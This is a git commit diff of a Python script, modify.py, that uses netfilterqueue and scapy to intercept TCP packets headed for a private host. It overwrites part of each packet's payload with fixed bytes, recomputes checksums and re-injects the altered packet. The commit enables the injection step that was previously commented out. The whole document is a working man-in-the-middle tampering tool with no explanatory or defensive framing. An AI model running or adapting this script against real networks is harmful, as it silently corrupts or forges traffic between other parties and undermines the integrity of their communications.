4d8c07c0cea3a093e889acc366b34b2c05bfcdb2
wadfx95174 <wadfx95174@gmail.com>
2020-09-14 14:30:27 +0800

    second commit

--- modify.py
+++ modify.py
@@ -1,29 +1,27 @@
-import netfilterqueue
+from netfilterqueue import NetfilterQueue
 from scapy.all import *
-
+print("start")
 def processPacket(packet):
-    
     pkt = IP(packet.get_payload())
-    if (pkt.haslayer(TCP) and pkt[TCP].flags=='PA' and pkt.getlayer(IP).dst == '192.168.164.140'):
+    print (pkt.show())
+    
+    if (pkt.haslayer(TCP) and pkt[TCP].flags=='PA' and pkt.getlayer(IP).dst == '192.168.2.101'):
         print('+')
         print (pkt[Raw].load)
-        #pkt[Raw].load = ''
-        #pkt[Raw].load = pkt[Raw].load.replace(b'x84B',b'x84A')
-        pkt[Raw].load =b'\x01\x02\x00\x00\x00\x0b\x01\x04\x08\x02\x0b\x19\xbb\x1e\x04\x00\x00'
-        #print (pkt[Raw].load)
+        pkt[Raw].load = pkt[Raw].load[:9] + b'\x0a\xb2\x0a\x01\x10\x85'
+        print (pkt[Raw].load)
         print('-')
         del pkt[IP].len
         del pkt[IP].chksum
         del pkt[TCP].chksum
-        # packet.set_payload(bytes(pkt))
+        packet.set_payload(bytes(pkt))
         print('pkt================================')
         print (pkt.show())
-        print('packet==================================')
-        print (IP(packet.get_payload()).show())
+        # print('packet==================================')
+        # print (IP(packet.get_payload()).show())
         print('====================================')
     packet.accept()
-    #packet.accept()
 
-queue = netfilterqueue.NetfilterQueue()
+queue = NetfilterQueue()
 queue.bind(0, processPacket)
 queue.run()
